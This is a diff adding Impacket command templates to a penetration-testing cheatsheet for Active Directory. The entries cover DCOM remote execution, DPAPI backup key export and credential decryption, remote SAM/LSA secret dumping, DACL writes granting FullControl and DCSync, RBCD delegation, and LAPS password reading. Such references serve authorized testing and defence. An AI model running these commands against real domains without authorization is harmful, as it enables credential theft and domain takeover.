@@ -113,6 +113,38 @@ import users
 import impacket_auth
 -->
 
+## Impacket dcomexec
+
+### dcomexec
+
+Semi-interactive shell via DCOM objects. Useful when WMI/SCM paths are noisy or blocked; `MMC20` is the most common object when no interactive user session exists.
+
+```sh title:"DCOM shell or command execution"
+dcomexec.py $auth_target $auth_flags -object $dcom_object $commands_template
+```
+<!-- cheat
+import domain_ip
+import templates
+import users
+import impacket_auth
+var dcom_object = printf 'MMC20\nShellWindows\nShellBrowserWindow\n' --- --header 'DCOM object'
+-->
+
+### dcomexec no output
+
+Run a single command without fetching output over SMB.
+
+```sh title:"DCOM silent command, no SMB output retrieval"
+dcomexec.py $auth_target $auth_flags -object $dcom_object -silentcommand -nooutput $commands_template
+```
+<!-- cheat
+import domain_ip
+import templates
+import users
+import impacket_auth
+var dcom_object = printf 'MMC20\nShellWindows\nShellBrowserWindow\n' --- --header 'DCOM object'
+-->
+
 ## Impacket secretsdump
 
 ### secretsdump
@@ -127,6 +159,57 @@ import domain_ip
 import templates
 import users
 import impacket_auth
+-->
+
+### dpapi backup key
+
+Retrieve the domain DPAPI backup key from a DC. This PVK can decrypt domain users' DPAPI masterkeys offline.
+
+```sh title:"Export domain DPAPI backup key"
+dpapi.py backupkeys -t $auth_target $auth_flags -export
+```
+<!-- cheat
+import domain_ip
+import users
+import impacket_auth
+-->
+
+### dpapi masterkey with backup key
+
+Decrypt a DPAPI masterkey with the domain backup key.
+
+```sh title:"Decrypt DPAPI masterkey with backup key"
+dpapi.py masterkey -file $masterkey_file -pvk $backup_key_pvk
+```
+<!-- cheat
+var masterkey_file
+var backup_key_pvk
+-->
+
+### dpapi credential blob
+
+Decrypt a DPAPI Credential Manager blob once you have the plaintext masterkey.
+
+```sh title:"Decrypt DPAPI credential file with masterkey"
+dpapi.py credential -file $credential_file -key $masterkey
+```
+<!-- cheat
+var credential_file
+var masterkey
+-->
+
+### regsecrets
+
+Dump SAM, cached domain credentials, and LSA secrets remotely through registry access. Lighter than full `secretsdump` when you do not need NTDS.
+
+```sh title:"Dump SAM/cache/LSA via remote registry"
+regsecrets.py $auth_target $auth_flags -outputfile $output_prefix
+```
+<!-- cheat
+import domain_ip
+import users
+import impacket_auth
+var output_prefix
 -->
 
 ## Impacket getTGT
@@ -455,6 +538,193 @@ import users
 import impacket_domain_auth
 -->
 
+## GetADComputers
+
+### List domain computers
+
+Enumerate computer accounts through LDAP. Add `-resolveIP` when you want DNS lookups resolved through the DC.
+
+```sh title:"List domain computer accounts"
+GetADComputers.py $auth_target $auth_flags -dc-ip $rhost_ip -resolveIP
+```
+<!-- cheat
+import domain_ip
+import users
+import impacket_domain_auth
+-->
+
+## addcomputer
+
+### Add machine account
+
+Create a computer account when `ms-DS-MachineAccountQuota` allows it. Common first step for RBCD and shadow credential chains.
+
+```sh title:"Create computer account via Impacket addcomputer"
+addcomputer.py $auth_target $auth_flags -dc-ip $rhost_ip -computer-name "$computer_name$" -computer-pass $computer_pass
+```
+<!-- cheat
+import domain_ip
+import users
+import impacket_domain_auth
+var computer_name
+var computer_pass
+-->
+
+## dacledit
+
+### Read target DACL
+
+Read ACEs from a target object over LDAP.
+
+```sh title:"Read AD object DACL"
+dacledit.py $auth_target $auth_flags -dc-ip $rhost_ip -target $target_object -action read
+```
+<!-- cheat
+import domain_ip
+import users
+import impacket_domain_auth
+var target_object
+-->
+
+### Grant FullControl
+
+Write a FullControl ACE for a controlled principal on a target object.
+
+```sh title:"Grant FullControl with dacledit"
+dacledit.py $auth_target $auth_flags -dc-ip $rhost_ip -principal $controlled_object -target $target_object -action write -rights FullControl
+```
+<!-- cheat
+import domain_ip
+import users
+import impacket_domain_auth
+var controlled_object
+var target_object
+-->
+
+### Grant DCSync
+
+Write DCSync replication rights on the domain object.
+
+```sh title:"Grant DCSync rights with dacledit"
+dacledit.py $auth_target $auth_flags -dc-ip $rhost_ip -principal $controlled_object -target-dn $domain_dn -action write -rights DCSync
+```
+<!-- cheat
+import domain_ip
+import users
+import impacket_domain_auth
+var controlled_object
+var domain_dn
+-->
+
+## owneredit
+
+### Change object owner
+
+Set a controlled principal as owner of a target object, then use `dacledit.py` to grant usable rights.
+
+```sh title:"Change AD object owner"
+owneredit.py $auth_target $auth_flags -dc-ip $rhost_ip -new-owner $controlled_object -target $target_object -action write
+```
+<!-- cheat
+import domain_ip
+import users
+import impacket_domain_auth
+var controlled_object
+var target_object
+-->
+
+## rbcd
+
+### Read RBCD
+
+Read the `msDS-AllowedToActOnBehalfOfOtherIdentity` security descriptor on a target computer.
+
+```sh title:"Read target RBCD entries"
+rbcd.py $auth_target $auth_flags -dc-ip $rhost_ip -delegate-to "$target_computer$" -action read
+```
+<!-- cheat
+import domain_ip
+import users
+import impacket_domain_auth
+var target_computer
+-->
+
+### Write RBCD
+
+Allow a controlled computer account to delegate to a target computer.
+
+```sh title:"Write RBCD delegation entry"
+rbcd.py $auth_target $auth_flags -dc-ip $rhost_ip -delegate-from "$controlled_computer$" -delegate-to "$target_computer$" -action write
+```
+<!-- cheat
+import domain_ip
+import users
+import impacket_domain_auth
+var controlled_computer
+var target_computer
+-->
+
+## findDelegation
+
+### Enumerate delegation
+
+Enumerate unconstrained delegation, constrained delegation, and RBCD relationships in the domain.
+
+```sh title:"Enumerate AD delegation relationships"
+findDelegation.py $auth_target $auth_flags -dc-ip $rhost_ip
+```
+<!-- cheat
+import domain_ip
+import users
+import impacket_domain_auth
+-->
+
+## ldap_shell
+
+### Interactive LDAP shell
+
+Open Impacket's LDAP shell for AD object reads and common modifications such as adding computers, changing passwords, and setting RBCD.
+
+```sh title:"Open interactive LDAP shell"
+ldap_shell.py $auth_target@$rhost_ip $auth_flags
+```
+<!-- cheat
+import domain_ip
+import users
+import impacket_domain_auth
+-->
+
+## machineAccountQuota
+
+### Check MachineAccountQuota
+
+Read `ms-DS-MachineAccountQuota` to see whether regular users can create computer accounts.
+
+```sh title:"Check ms-DS-MachineAccountQuota"
+machineAccountQuota.py $auth_target $auth_flags -dc-ip $rhost_ip
+```
+<!-- cheat
+import domain_ip
+import users
+import impacket_domain_auth
+-->
+
+## GetLAPSPassword
+
+### Dump readable LAPS passwords
+
+Read LAPS passwords from LDAP for computer objects the current principal can read.
+
+```sh title:"Dump readable LAPS passwords"
+GetLAPSPassword.py $auth_target $auth_flags -dc-ip $rhost_ip -outputfile $output_file
+```
+<!-- cheat
+import domain_ip
+import users
+import impacket_domain_auth
+var output_file
+-->
+
 ## Impacket recon misc
 
 ### reg.py remote query
@@ -534,6 +804,29 @@ samrdump.py $auth_target $auth_flags
 import domain_ip
 import users
 import impacket_auth
+-->
+
+### DumpNTLMInfo
+
+Perform unauthenticated NTLM negotiation and print host/domain/build metadata plus SMB signing status.
+
+```sh title:"Unauthenticated NTLM target fingerprint"
+DumpNTLMInfo.py $rhost_ip
+```
+<!-- cheat
+import domain_ip
+-->
+
+### Check LDAP relay status
+
+Check LDAP signing and channel binding enforcement on a DC to decide whether LDAP/LDAPS relay is viable.
+
+```sh title:"Check LDAP signing and channel binding"
+CheckLDAPStatus.py -dc-ip $rhost_ip -domain $domain
+```
+<!-- cheat
+import domain_ip
+var domain
 -->
 
 ## Impacket secretsdump (offline / variants)
